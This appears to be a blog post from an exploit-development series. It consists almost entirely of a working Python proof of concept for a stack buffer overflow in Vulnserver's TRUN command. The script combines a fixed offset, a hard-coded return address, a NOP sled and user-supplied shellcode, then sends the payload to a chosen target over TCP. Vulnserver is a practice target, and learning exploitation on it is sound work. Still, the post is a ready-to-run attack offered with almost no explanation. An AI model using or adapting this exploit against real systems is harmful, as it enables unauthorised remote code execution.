---
title: Exploit Development - Vulnserver v1.00 Part 2
published: 2025-10-22
description: RCE exploit development against Vulnserver v1.00
tags: [binary exploitation, exploit, vulnerability research]
category: Exploit Development
draft: false
lang: en
---

# Vulnserver v1.00 RCE Exploit Dev

## PoC
```python
from argparse import ArgumentParser
from socket import *
import struct

def createPayload(shellcode_path: str):
    data = b"A" * 2006
    return_address = struct.pack("<L", 0x625011BB)
    nop_sled = b"\x90" * 50
    shellcode = b""

    with open(shellcode_path, "rb") as fp:
        shellcode = fp.read()
        fp.close()

    payload = b"TRUN \x2E"
    payload += data
    payload += return_address
    payload += nop_sled
    payload += shellcode

    return payload

def exploit(ip: str, port: int, shellcode_path: str):
    print("[~] Generating payload...")
    payload = createPayload(shellcode_path)
    print("[+] Payload generated")

    s = socket(AF_INET, SOCK_STREAM)
    print(f"[~] Connecting to the target: [{ip}]:{port}")
    s.connect((ip, port))

    print("[~] Waiting for a connection message...")
    conn_msg = s.recv(65535)
    print(f"[+] A connection message received: {conn_msg.decode()}")

    print("[~] Sending the payload...")
    s.send(payload)
    s.close()
    print("[+] Connection closed")

    print("[+] RCE Exploit Completed")

def main():
    parser = ArgumentParser(
        prog="Vulnserver v1.00 Exploit",
        description="TRUN command BOF DoS Vulnerability"
    )
    parser.add_argument(
        "-t", "--target",
        type=str,
        help="Set target IPv4 address",
        required=True
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        help="Set target port number",
        required=True
    )
    parser.add_argument(
        "-s", "--shellcode",
        type=str,
        help="Set shellcode file path",
        required=True
    )

    args = parser.parse_args()

    target_ip       = str(args.target)
    target_port     = int(args.port)
    shellcode_path  = str(args.shellcode)

    exploit(target_ip, target_port, shellcode_path)

if __name__ == "__main__":
    main()
```

soon continue